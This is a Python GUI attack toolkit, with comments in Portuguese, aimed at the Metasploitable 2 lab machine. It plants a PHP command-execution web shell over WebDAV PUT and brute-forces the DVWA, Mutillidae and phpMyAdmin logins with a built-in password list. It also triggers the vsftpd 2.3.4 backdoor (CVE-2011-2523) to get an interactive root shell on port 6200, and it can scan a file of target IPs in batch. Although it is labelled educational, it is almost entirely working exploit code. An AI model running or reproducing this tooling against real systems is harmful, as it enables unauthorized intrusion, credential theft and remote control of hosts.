#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Toolkit GUI - Metasploitable 2
# Aba 1: HTTP (WebDAV PUT + Brute-force + Shell)
# Aba 2: vsftpd 2.3.4 Backdoor RCE (CVE-2011-2523)
# Uso educacional / testes autorizados.

import urllib.request, urllib.error, urllib.parse, threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import socket

# ================= Paleta =================
COR_FUNDO    = "#000000"
COR_TEXTO    = "#00FF00"
COR_VERDE_CL = "#39FF14"
COR_ABOBORA  = "#FF8C00"
COR_VERMELHO = "#FF3333"
COR_ENTRADA  = "#0A0A0A"
FONTE        = ("Consolas", 11)

UA = "Mozilla/5.0 (Windows NT 5.1; rv:1.9) Gecko/2008072905 Firefox/3.0"
SHELL_PATH = "/dav/cmd.php"
PORTA_FTP, PORTA_SHELL = 21, 6200

def req(method, url, data=None, headers=None, timeout=8):
    h = {"User-Agent": UA}
    if headers: h.update(headers)
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace")
    except Exception as e:
        return None, str(e)

# =====================================================================
# LÓGICA ABA 1 - HTTP (WebDAV + Brute + Shell HTTP)
# =====================================================================
SHELL_PHP = """<?php
if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd'] . ' 2>&1'); }
else { echo 'SHELL_OK'; }
?>"""

USERS = ["admin", "root", "administrator", "user", "test",
         "gordonb", "1337", "pablo", "smithy", "john", "jane"]
PASSWORDS = ["", "admin", "password", "123456", "root", "toor", "admin123", "12345",
             "password123", "letmein", "welcome", "monkey", "abc123", "qwerty",
             "admin@123", "111111", "pass123", "secure", "changeme", "default",
             "adminpass", "UserPass123"]

TARGET_FORMS = [
    ("/dvwa/login.php",       "username", "password", "Welcome"),
    ("/mutillidae/index.php", "username", "password", "Logged In"),
    ("/phpMyAdmin/",          "pma_username", "pma_password", "CREATE DATABASE"),
]

def dav_put(base, log):
    log("[*] Testando WebDAV PUT em /dav/ ...", "sistema")
    r = urllib.request.Request(base + "/dav/", method="OPTIONS", headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(r, timeout=8) as resp:
            allow = resp.headers.get("Allow", "")
        log(f"[*] Allow: {allow}", "sistema")
    except Exception as e:
        log(f"[-] /dav/ inacessível: {e}", "erro"); return
    if "PUT" not in allow:
        log("[-] PUT não suportado.", "erro"); return
    s, b = req("PUT", base + SHELL_PATH, data=SHELL_PHP.encode(),
               headers={"Content-Type": "application/x-httpd-php"})
    if s in (200, 201, 204):
        log(f"[+] PUT OK ({s}) -> {base}{SHELL_PATH}", "sistema")
        s2, b2 = req("GET", base + SHELL_PATH + "?cmd=id")
        if s2 and "uid=" in b2:
            log("[+] RCE via WebDAV confirmada! Use o campo SHELL abaixo.", "sistema")
        else:
            log("[?] Upload feito, execução não confirmada: " + b2[:200], "erro")
    else:
        log(f"[-] PUT falhou ({s}): {b[:150]}", "erro")

def shell_cmd_http(base, cmd, log):
    s, b = req("GET", base + SHELL_PATH + "?cmd=" + urllib.parse.quote(cmd))
    log("$ " + cmd, "comando")
    log(b if s else f"[erro] {b}", "abobora")

def brute(base, log, stop_flag):
    log("[*] Iniciando brute-force nos formulários conhecidos ...", "sistema")
    for path, uf, pf, success in TARGET_FORMS:
        url = base + path
        s, b = req("GET", url)
        if s is None or s in (301, 302):
            continue
        log(f"[*] Testando {url} ...", "sistema")
        achou = False
        for u in USERS:
            if achou: break
            for p in PASSWORDS:
                if stop_flag[0]:
                    log("[!] Interrompido.", "erro"); return
                data = urllib.parse.urlencode({uf: u, pf: p}).encode()
                s2, b2 = req("POST", url, data=data)
                if path.startswith("/phpMyAdmin"):
                    if s2 in (200, 302) and "Access denied" not in b2 and "denied" not in b2.lower():
                        log(f"[+] CREDENCIAL phpMyAdmin:  {u}  /  {p!r}", "cred")
                        achou = True; break
                else:
                    if s2 and (success in b2 or s2 == 302):
                        log(f"[+] CREDENCIAL ENCONTRADA em {path}:  {u}  /  {p!r}", "cred")
                        achou = True; break
        if not achou:
            log(f"[-] Nenhuma credencial em {path}", "erro")
    log("[*] Brute-force concluído.", "sistema")

def run_all_http(base, log, stop_flag):
    log(f"[*] Alvo: {base} (Metasploitable 2)", "sistema")
    s, _ = req("GET", base + "/")
    log(f"[*] HTTP status: {s}", "sistema")
    dav_put(base, log)
    for p in ["/twiki/bin/view", "/phpMyAdmin/", "/dvwa/login.php", "/mutillidae/"]:
        s2, _ = req("GET", base + p)
        if s2 == 200:
            log(f"[+] Exposto: {p}", "sistema")
    brute(base, log, stop_flag)
    log("[*] Concluído.", "sistema")

# =====================================================================
# LÓGICA ABA 2 - vsftpd 2.3.4 Backdoor (CVE-2011-2523)
# =====================================================================
def sock_ler(sock, timeout=3):
    sock.settimeout(timeout)
    dados = b""
    try:
        while True:
            parte = sock.recv(4096)
            if not parte:
                break
            dados += parte
            sock.settimeout(0.4)
    except (socket.timeout, OSError):
        pass
    return dados.decode(errors="replace")

# =====================================================================
# GUI
# =====================================================================
class Aplicativo(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Toolkit Metasploitable 2 HTTP + vsftpd")
        self.geometry("1100x680")
        self.configure(bg=COR_FUNDO)

        self.shell_ftp = None          # shell vsftpd (porta 6200)
        self.alvos_pendentes = []
        self.stop_flag = [False]

        # ---- Notebook (abas) ----
        estilo = ttk.Style(self)
        estilo.theme_use("clam")
        estilo.configure("TNotebook", background=COR_FUNDO, borderwidth=0)
        estilo.configure("TNotebook.Tab", background="#111111", foreground=COR_TEXTO,
                         font=FONTE, padding=[14, 6])
        estilo.map("TNotebook.Tab",
                   background=[("selected", "#003300")],
                   foreground=[("selected", COR_VERDE_CL)])

        self.nb = ttk.Notebook(self)
        self.nb.pack(fill="both", expand=True, padx=6, pady=6)

        self.aba_http = tk.Frame(self.nb, bg=COR_FUNDO)
        self.aba_ftp  = tk.Frame(self.nb, bg=COR_FUNDO)
        self.nb.add(self.aba_http, text="  HTTP / WebDAV / Brute  ")
        self.nb.add(self.aba_ftp,  text="  vsftpd 2.3.4 Backdoor  ")

        self._montar_aba_http()
        self._montar_aba_ftp()
        self.bind("<Control-l>", lambda e: self.limpar_aba_ativa())

    # ---------- helper widgets ----------
    def _campo(self, pai, variavel, largura):
        return tk.Entry(pai, textvariable=variavel, width=largura,
                        bg=COR_ENTRADA, fg=COR_TEXTO, insertbackground=COR_TEXTO,
                        font=FONTE, relief="flat",
                        highlightbackground=COR_TEXTO, highlightthickness=1)

    def _botao(self, pai, texto, comando):
        return tk.Button(pai, text=texto, command=comando,
                         bg=COR_ENTRADA, fg=COR_VERDE_CL,
                         activebackground="#003300", activeforeground=COR_VERDE_CL,
                         font=FONTE, relief="groove", borderwidth=1)

    def _terminal(self, pai):
        out = scrolledtext.ScrolledText(
            pai, bg=COR_FUNDO, fg=COR_TEXTO, insertbackground=COR_TEXTO,
            font=FONTE, selectbackground="#003300", selectforeground=COR_VERDE_CL,
            relief="flat", borderwidth=2,
            highlightbackground=COR_TEXTO, highlightcolor=COR_VERDE_CL,
            highlightthickness=1)
        out.pack(fill="both", expand=True, padx=8, pady=6)
        for tag, cor in [("sistema", COR_TEXTO), ("comando", COR_VERDE_CL),
                         ("abobora", COR_ABOBORA), ("erro", COR_VERMELHO),
                         ("cred", COR_ABOBORA)]:
            out.tag_configure(tag, foreground=cor)
        out.tag_configure("cred", font=FONTE + ("bold",))
        out.configure(state="disabled")
        return out

    # ============================================================
    # ABA 1 - HTTP
    # ============================================================
    def _montar_aba_http(self):
        topo = tk.Frame(self.aba_http, bg=COR_FUNDO)
        topo.pack(fill="x", padx=8, pady=6)
        tk.Label(topo, text="URL alvo:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left")
        self.http_url = tk.StringVar(value="http://192.168.0.13")
        self._campo(topo, self.http_url, 48).pack(side="left", padx=5)
        self._botao(topo, "Executar", self.http_start).pack(side="left", padx=3)
        self._botao(topo, "Parar brute", lambda: self.stop_flag.__setitem__(0, True)).pack(side="left", padx=3)
                
        sh = tk.Frame(self.aba_http, bg=COR_FUNDO)
        sh.pack(fill="x", padx=8, pady=4)
        tk.Label(sh, text="SHELL > ", bg=COR_FUNDO, fg=COR_VERDE_CL, font=FONTE).pack(side="left")
        self.http_cmd = tk.StringVar()
        c = self._campo(sh, self.http_cmd, 55)
        c.pack(side="left", padx=4, fill="x", expand=True)
        c.bind("<Return>", lambda e: self.http_enviar())
        self._botao(sh, "Enviar", self.http_enviar).pack(side="left", padx=3)

        self.http_out = self._terminal(self.aba_http)

    def http_log(self, texto, tag="sistema"):
        self._escrever(self.http_out, texto, tag)

    def _escrever(self, out, texto, tag):
        out.configure(state="normal")
        out.insert("end", texto + "\n", tag)
        out.see("end")
        out.configure(state="disabled")
        self.update_idletasks()

    def http_start(self):
        base = self.http_url.get().strip().rstrip("/")
        if not base.startswith("http"):
            messagebox.showwarning("Aviso", "Informe a URL (http://IP)")
            return
        self.stop_flag[0] = False
        threading.Thread(target=lambda: run_all_http(base, self.http_log, self.stop_flag),
                         daemon=True).start()

    def http_enviar(self):
        cmd = self.http_cmd.get().strip()
        if not cmd: return
        self.http_cmd.set("")
        base = self.http_url.get().strip().rstrip("/")
        threading.Thread(target=lambda: shell_cmd_http(base, cmd, self.http_log),
                         daemon=True).start()

    # ============================================================
    # ABA 2 - vsftpd
    # ============================================================
    def _montar_aba_ftp(self):
        topo = tk.Frame(self.aba_ftp, bg=COR_FUNDO)
        topo.pack(fill="x", padx=8, pady=6)
        tk.Label(topo, text="IP:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left")
        self.ftp_alvo = tk.StringVar(value="192.168.0.13")
        self._campo(topo, self.ftp_alvo, 30).pack(side="left", padx=5)
        self._botao(topo, "Explorar", self.ftp_explorar).pack(side="left", padx=4)

        tk.Label(topo, text="Lista_Alvos.txt:", bg=COR_FUNDO, fg=COR_TEXTO, font=FONTE).pack(side="left", padx=(12, 0))
        self.ftp_lista = tk.StringVar()
        self._campo(topo, self.ftp_lista, 22).pack(side="left", padx=5)
        self._botao(topo, "Procurar...", self.ftp_escolher).pack(side="left", padx=2)
        self._botao(topo, "Escanear Lista", self.ftp_escanear).pack(side="left", padx=2)

        self.ftp_out = self._terminal(self.aba_ftp)

        baixo = tk.Frame(self.aba_ftp, bg=COR_FUNDO)
        baixo.pack(fill="x", padx=8, pady=6)
        tk.Label(baixo, text="shell> ", bg=COR_FUNDO, fg=COR_VERDE_CL, font=FONTE).pack(side="left")
        self.ftp_cmd = tk.StringVar()
        c = self._campo(baixo, self.ftp_cmd, 55)
        c.pack(side="left", padx=4, fill="x", expand=True)
        c.bind("<Return>", lambda e: self.ftp_enviar())
        self._botao(baixo, "Executar", self.ftp_enviar).pack(side="left", padx=3)
        self._botao(baixo, "Fechar Shell", self.ftp_fechar).pack(side="left", padx=3)
        self._botao(baixo, "Limpar Tela", self.limpar_aba_ativa).pack(side="left", padx=3)

    def ftp_log(self, texto, tag="sistema"):
        self._escrever(self.ftp_out, texto, tag)

    def ftp_escolher(self):
        arq = filedialog.askopenfilename(title="Selecione o Lista_Alvos.txt",
                                         filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if arq:
            self.ftp_lista.set(arq)

    def ftp_escanear(self):
        try:
            with open(self.ftp_lista.get(), encoding="utf-8") as f:
                alvos = [l.strip() for l in f if l.strip()]
        except Exception as e:
            messagebox.showerror("Erro", f"Não foi possível abrir o arquivo:\n{e}")
            return
        if not alvos:
            messagebox.showwarning("Aviso", "A lista está vazia.")
            return
        self.ftp_log(f"[*] Escaneando {len(alvos)} alvo(s)", "sistema")
        self.alvos_pendentes = alvos
        self._proximo_alvo_ftp()

    def _proximo_alvo_ftp(self):
        if not self.alvos_pendentes:
            self.ftp_log("[*] Scan concluído. Digite comandos no shell>", "sistema")
            return
        alvo = self.alvos_pendentes.pop(0)
        self.ftp_log(f"\n{'='*60}\n[*] Alvo: {alvo}", "sistema")
        self.ftp_alvo.set(alvo)
        self.ftp_explorar()
        self.after(15000, self._proximo_alvo_ftp)

    def ftp_explorar(self):
        alvo = self.ftp_alvo.get().strip()
        if not alvo:
            messagebox.showwarning("Aviso", "Digite o IP do alvo.")
            return
        self.ftp_log(f"\n[*] Explorando: {alvo}", "sistema")
        threading.Thread(target=self._ftp_conectar, args=(alvo,), daemon=True).start()

    def _ftp_conectar(self, alvo):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((alvo, PORTA_FTP))
            banner = sock_ler(sock)
            self.ftp_log(f"[+] Banner: {banner.strip()}", "sistema")
            if "2.3.4" not in banner:
                self.ftp_log("[!] Banner não mostra vsftpd 2.3.4. Continuando...", "erro")
            sock.send(b"USER exploit:)\r\n")
            self.ftp_log(f"[*] USER -> {sock_ler(sock).strip()}", "sistema")
            sock.send(b"PASS senha\r\n")
            self.ftp_log(f"[*] PASS -> {sock_ler(sock).strip()}", "sistema")
            sock.close()
        except Exception as e:
            self.ftp_log(f"[!] Erro na conexão FTP: {e}", "erro")
            return
        self.ftp_log("[*] Aguardando backdoor abrir a shell na porta 6200", "sistema")
        self.after(1000, self._ftp_shell, alvo, 1)

    def _ftp_shell(self, alvo, tentativa):
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.settimeout(4)
        try:
            shell.connect((alvo, PORTA_SHELL))
        except OSError:
            if tentativa < 8:
                self.ftp_log(f"    tentativa {tentativa}: porta 6200 fechada, aguardando...", "sistema")
                self.after(1000, self._ftp_shell, alvo, tentativa + 1)
                return
            self.ftp_log("[!] Porta 6200 não abriu após 8 tentativas.", "erro")
            self.ftp_log("[!] Possíveis causas: vsftpd sem backdoor ou firewall.", "erro")
            return
        self.shell_ftp = shell
        self.ftp_log(f"[+] BACKDOOR ATIVA! Shell em: {alvo}:{PORTA_SHELL}", "cred")
        shell.send(b"id; uname -a; whoami\n")
        self.after(800, lambda: self._ftp_mostrar(self.ftp_log("[+] Conectado com sucesso!\n", "sistema") or
                                                  self.ftp_log(sock_ler(self.shell_ftp), "abobora")))

    def _ftp_mostrar(self, _=None):
        pass

    def ftp_enviar(self):
        cmd = self.ftp_cmd.get().strip()
        if not cmd: return
        if cmd in ("clear", "cls", "limpar"):
            self.limpar_aba_ativa(); self.ftp_cmd.set(""); return
        if self.shell_ftp is None:
            messagebox.showwarning("Aviso", "Explore um alvo primeiro (botão 'Explorar').")
            return
        self.ftp_log(f"shell> {cmd}", "comando")
        self.ftp_cmd.set("")
        try:
            self.shell_ftp.send((cmd + "\n").encode())
        except OSError:
            self.ftp_log("[!] Conexão perdida.", "erro")
            self.shell_ftp = None
            return
        self.after(700, lambda: self.ftp_log(sock_ler(self.shell_ftp) or "(sem saída)", "abobora"))

    def ftp_fechar(self):
        if self.shell_ftp:
            try: self.shell_ftp.close()
            except OSError: pass
            self.shell_ftp = None
            self.ftp_log("[*] Shell fechada.", "sistema")

    # ============================================================
    # Comuns
    # ============================================================
    def limpar_aba_ativa(self):
        idx = self.nb.index(self.nb.select())
        out = self.http_out if idx == 0 else self.ftp_out
        out.configure(state="normal")
        out.delete("1.0", "end")
        out.configure(state="disabled")

if __name__ == "__main__":
    Aplicativo().mainloop()
